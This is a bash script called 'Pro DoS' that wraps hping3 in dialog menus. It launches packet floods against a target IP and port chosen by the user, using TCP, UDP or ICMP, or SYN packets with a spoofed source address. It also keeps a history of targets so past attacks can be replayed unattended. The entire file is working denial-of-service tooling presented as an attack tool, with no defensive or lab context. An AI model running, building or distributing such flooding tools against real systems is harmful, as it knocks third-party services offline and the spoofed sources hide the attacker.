#!/bin/bash
if [ "$1" = "Install" ] || [ "$1" = "install" ]; then
    if [ ! -d ~/.dos_history/ ]; then
        mkdir ~/.dos_history/
        echo "Couldn't find ${HOME}/.dos_history, attempting to create it."
    else
        echo "Found ${HOME}/.dos_history"
    fi
    DIALOG_VER=`dialog -v | sed -n 1p | awk '{printf $5}' | cut -f1 -d'-'`
    if [ "${DIALOG_VER}" != "" ]; then
        echo "Found dialog"
    else
        echo "dialog does not appear to be installed."
    fi
    if [ ! -e ~/.dos_history/.last_dos ]; then
    # No indents to stop indenting on the file.
        echo "Last_IP: ADDRESS_HERE
Last_Protocol: TCP
Last_Port: PORT_HERE
Last_Payload_Size: 64
Last_Spoof_Host: example.com" > ~/.dos_history/.last_dos
        echo "Couldn't find ${HOME}/.dos_history/.last_dos, made example automatically."
    else
        echo "Found ${HOME}/.dos_history/.last_dos"
    fi
    HPING3_TEST=`hping3 -v | sed -n 1p | awk '{printf $1}'`
    if [ "${HPING3_TEST}" != "" ]; then
        echo "Found hping3"
    else
        echo "hping3 does not appear to be installed."
        echo "hping3 is required, prior versions will not suffice since they don't appear to have --flood."
    fi
    echo "Would you like to continue?"
    printf "[Y/N] [Y]: "
    read ANSWER
    if [ "${ANSWER}" = "N" ] || [ "${ANSWER}" = "n" ]; then
        exit 0
    fi
fi
DOS_HISTORY_FILE=~/.dos_history/.last_dos
LAST_IP=`grep -w 'Last_IP:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
LAST_PROTOCOL=`grep -w 'Last_Protocol:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
LAST_PORT=`grep -w 'Last_Port:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
LAST_PAYLOAD_SIZE=`grep -w 'Last_Payload_Size:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
LAST_SPOOF_HOST=`grep -w 'Last_Spoof_Host:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
UDP=off
TCP=off
SYN=off
ICMP=off
if [ ${LAST_PROTOCOL} = TCP ]; then
    TCP=on
elif [ ${LAST_PROTOCOL} = UDP ]; then
    UDP=on
elif [ ${LAST_PROTOCOL} = SYN ]; then
    SYN=on
elif [ ${LAST_PROTOCOL} = ICMP ]; then
    ICMP=on
fi

if [ ${TCP} = on ]; then
    PROTOCOL=TCP
elif [ ${UDP} = on ]; then
    PROTOCOL=UDP
elif [ ${SYN} = on ]; then
    PROTOCOL=TCP
    SYN=true
elif [ ${ICMP} = on ]; then
    PROTOCOL=ICMP
fi
BACKTITLE="Pro DoS v0.1337b2"
function func_history {
echo "Protocol: ${PROTOCOL}"
echo "IP: ${LAST_IP}"
echo "Port: ${LAST_PORT}"
if [ SYN = true ]; then
    echo "SYN: Yes"
    echo "Spoof: ${LAST_SPOOF_HOST}"
else
    echo "Payload Size: ${LAST_PAYLOAD_SIZE}"
fi
if [ ${PROTOCOL} = TCP ]; then
    hping3 --flood -I eth0 -p ${LAST_PORT} ${LAST_IP} -d ${LAST_PAYLOAD_SIZE}
elif [ ${PROTOCOL} = UDP ]; then
    hping3 --udp --flood -I eth0 -p ${LAST_PORT} ${LAST_IP} -d ${LAST_PAYLOAD_SIZE}
elif [ ${PROTOCOL} = SYN ]; then
    hping3 --flood -I eth0 -S -p ${LAST_PORT} -a ${LAST_SPOOF_HOST} ${LAST_IP}
fi
exit 0
}
#No GUI, derive parameters from the history.
if [ "$1" = "Unattended" ] || [ "$1" = "unattended" ]; then
    func_history
fi
if [ "$1" = "History" ] || [ "$1" = "history" ]; then
    LAST_DIR=`pwd`
    cd ~/.dos_history/
    select DOS_SESSION in *; do
#    DOS_SESSION=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --fselect ~/.dos_history/ 20 50 --stdout`
    LAST_IP=`grep -w 'Last_IP:' ${DOS_SESSION} | awk '{printf $2}'`
    LAST_PROTOCOL=`grep -w 'Last_Protocol:' ${DOS_SESSION} | awk '{printf $2}'`
    LAST_PORT=`grep -w 'Last_Port:' ${DOS_SESSION} | awk '{printf $2}'`
    LAST_PAYLOAD_SIZE=`grep -w 'Last_Payload_Size:' ${DOS_SESSION} | awk '{printf $2}'`
    LAST_SPOOF_HOST=`grep -w 'Last_Spoof_Host:' ${DOS_SESSION} | awk '{printf $2}'`
    func_history
    done
    cd ${LAST_DIR}
fi
#7:58PM 13/01/2012
echo "TCP is ${TCP} UDP is ${UDP} SYN is ${SYN} ICMP is ${ICMP}"
sleep 3
opt=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --radiolist "What method of attack?" 11 30 4 \
TCP TCP ${TCP} \
UDP UDP ${UDP} \
SYN SYN ${SYN} \
ICMP ICMP ${ICMP} \
--stdout`

function main {
    IP=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Specify an IP address or host." 8 40 ${LAST_IP} --stdout`
    PORT=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Specify a port to attack." 8 40 ${LAST_PORT} --stdout`
    if [ "${PORT}" -gt "65535" ]; then
        dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --infobox "Higher than maximum allowable port number entered." 3 55; exit 0
    fi
    PAYLOAD_SIZE=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Payload size? (1500 bytes maximum)" 8 40 ${LAST_PAYLOAD_SIZE} --stdout`
    if [ "${PAYLOAD_SIZE}" -gt 1500 ]; then
        dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --ok-label "Continue anyway" --msgbox "Warning: Most routers will drop packets that are larger than 1500 bytes." 5 80
    fi
    DATE=`date`
#No indents here as it didn't work with them.
echo "Generated ${DATE}
Last_IP: ${IP}
Last_Port: ${PORT}
Last_Protocol: ${opt}
Last_Payload_Size: ${PAYLOAD_SIZE}" | tee ~/.dos_history/.last_dos ~/.dos_history/${IP}
}

function countdown {
    dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --infobox "Beginning attack in 3 seconds." 3 35
    sleep 3
    dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --infobox "Attack..." 3 25
}

if [ "${opt}" = "TCP" ]; then
    main
    countdown
    hping3 --flood -I eth0 -p ${PORT} ${IP} -d ${PAYLOAD_SIZE}
elif [ "${opt}" = "UDP" ]; then
    main
    countdown
    hping3 --udp --flood -I eth0 -p ${PORT} ${IP} -d ${PAYLOAD_SIZE}
elif [ "${opt}" = "SYN" ]; then
    main
    SPOOF_HOST=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "What host/IP should be spoofed?" 8 40 --stdout`
    echo "Last_Spoof_Host: ${SPOOF_HOST}" >> ~/.dos_history/${IP}
    echo "Last_Spoof_Host: ${SPOOF_HOST}" >> ~/.dos_history/.last_dos
    countdown
    hping3 --flood -I eth0 -S -p ${PORT} -a ${SPOOF_HOST} ${IP}
elif [ "${opt}" = "ICMP" ]; then
    main
    countdown
    hping3 --icmp --flood -I eth0 -p ${PORT} ${IP} -d ${PAYLOAD_SIZE}
fi